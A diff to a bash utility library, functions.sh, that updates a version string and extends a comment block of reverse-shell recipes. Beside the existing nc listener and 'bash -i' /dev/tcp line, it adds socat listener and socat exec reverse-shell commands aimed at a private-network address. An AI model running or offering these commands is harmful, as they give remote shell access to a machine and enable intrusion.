@@ -21,7 +21,7 @@ set -o nounset   ## set -u : exit the script if you try to use an uninitialised 
 fi
 set -o errexit   ## set -e : exit the script if any statement returns a non-true return value
 
-VERSION+=("functions.sh - efe50c1 - 2021-11-09T13:31:17+08:00")
+VERSION+=("39697f8[2021-11-15T09:27:26+08:00]:functions.sh")
 
 # need bash version >= 4.2 for associative arrays and other features.
 if (( BASH_VERSINFO[0]*100 + BASH_VERSINFO[1] < 402 )); then
@@ -106,7 +106,10 @@ disply_func() {
 }
 # reverse-shell
 # local<192.168.168.A>  run: nc -lp9999
+# local<192.168.168.A>  run: socat file:`tty`,raw,echo=0 tcp-listen:9999
 # remote<192.168.168.B> run: bash -i &> /dev/tcp/192.168.168.A/9999 0>&1
+# remote<192.168.168.B> run: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.168.A:9999
+
 
 eval2bg() {
     #Keep Background Processes Running After a Shell Exits(nohup/disown)
